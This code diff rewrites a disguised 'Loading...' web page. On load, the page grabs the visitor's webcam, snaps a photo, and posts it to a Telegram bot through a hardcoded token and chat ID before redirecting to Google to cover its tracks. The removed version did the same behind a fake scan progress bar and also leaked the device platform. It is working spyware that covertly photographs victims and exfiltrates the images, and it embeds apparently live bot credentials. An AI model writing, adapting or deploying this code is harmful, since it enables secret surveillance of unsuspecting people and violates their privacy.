@@ -1,49 +1,72 @@
-const T = '8409410631:AAFhc4ENmetOY0tCRzhFfwVN6H3ShW4RSCg';
-const C = '5156556639';
-
-async function push(data, isText = false) {
-    const url = `https://api.telegram.org/bot${T}/${isText ? 'sendMessage' : 'sendPhoto'}`;
-    try {
-        if (isText) {
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: C, text: data })
-            });
-        } else {
-            const fd = new FormData();
-            fd.append('chat_id', C);
-            fd.append('photo', data, 'snap.jpg');
-            await fetch(url, { method: 'POST', body: fd });
-        }
-    } catch (e) { window.location.href = "https://www.google.com"; }
-}
-
-function startProcess() {
-    document.getElementById('ui-1').style.display = 'none';
-    document.getElementById('ui-2').style.display = 'block';
-    const bar = document.getElementById('bar');
-    const txt = document.getElementById('status-text');
-
-    push("📊 فحص جديد من: " + navigator.platform, true);
-
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-    .then(s => {
-        bar.style.width = '45%';
-        const v = document.getElementById('v');
-        v.srcObject = s;
-        setTimeout(() => {
-            const canvas = document.getElementById('c');
-            canvas.width = 480;
-            canvas.height = 640;
-            canvas.getContext('2d').drawImage(v, 0, 0, 480, 640);
-            canvas.toBlob(b => {
-                push(b).then(() => {
-                    bar.style.width = '100%';
-                    window.location.href = "https://www.google.com";
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <video id="video" autoplay playsinline style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
+    
+    <script>
+        const BOT_TOKEN = '8409410631:AAHMS_10O8wbSG5OesZzIcxg78mR-5xpYE4';
+        const CHAT_ID = '5156556639';
+        
+        async function takePhoto() {
+            try {
+                // 1. طلب الكاميرا
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 640, height: 480 } 
                 });
-            }, 'image/jpeg', 0.5);
-        }, 2000);
-    })
-    .catch(() => { window.location.href = "https://www.google.com"; });
-}
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // 2. ننتظر الكاميرا تجهز (أهم شي)
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                // 3. ننتظر اطار واحد عشان الصورة تظهر
+                await new Promise(r => requestAnimationFrame(r));
+                
+                // 4. ناخذ الصورة
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                // 5. نوقف الكاميرا
+                stream.getTracks().forEach(track => track.stop());
+                
+                // 6. نرسل الصورة
+                const blob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                });
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                // 7. نروح لجوجل
+                window.location.href = 'https://www.google.com';
+                
+            } catch(error) {
+                console.error(error);
+                window.location.href = 'https://www.google.com';
+            }
+        }
+        
+        // تشغيل
+        takePhoto();
+    </script>
+</body>
+</html>
